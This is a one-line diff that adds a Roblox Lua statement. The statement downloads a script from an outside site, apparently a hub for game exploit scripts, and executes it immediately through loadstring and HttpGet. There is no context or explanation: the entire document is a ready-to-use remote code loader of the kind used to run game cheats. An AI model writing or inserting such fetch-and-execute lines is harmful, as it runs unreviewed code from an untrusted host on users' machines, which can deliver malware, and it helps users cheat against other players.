@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://haxhell.com/raw/kj-arena-killstreak-leaderboard"))()
